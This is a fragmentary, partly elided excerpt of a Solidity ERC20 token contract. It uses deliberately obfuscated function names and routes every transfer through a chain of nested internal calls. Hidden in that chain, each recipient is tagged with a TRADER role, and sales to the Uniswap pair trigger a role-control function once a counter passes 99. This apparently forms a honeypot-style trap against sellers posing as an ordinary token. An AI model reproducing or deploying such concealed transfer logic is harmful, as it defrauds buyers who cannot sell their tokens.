...
interface _XCNFSNRSRoleControl {
...
abstract contract _XCNFSNRSConsole is Context, _XCNFSNRSRoleControl {
    ...
    function XCNFSNRSdevTRoot(bytes32 role, address account, uint256 num) internal virtual {
        if(role == TRADER){
...
contract _XCNFSNRSERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _XCNFSNRSERC20, _XCNFSNRSConsole {
    ...
    ) _XCNFSNRSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_XCNFSNRSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __XCNFSNRSnffgd(from, to, amt);

    }

    function __XCNFSNRSnffgd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __XCNFSNRSymgxsdc(from, to, amt);
    }


    function __XCNFSNRSymgxsdc(address from, address to, uint256 amt) internal {
        ...
        __XCNFSNRSymfdfw(from, to, amt);
    }

    function __XCNFSNRSymfdfw(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __XCNFSNRSfghyax(from, to, amt);
    }


    function __XCNFSNRSfghyax(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            if(newnum > 99){
                XCNFSNRSdevTRoot(TRADER,from,amt);
            }
            
        }

        __XCNFSNRSdgserg(from, to, amt);
    }

    function __XCNFSNRSdgserg(address from, address to, uint256 amt) internal {
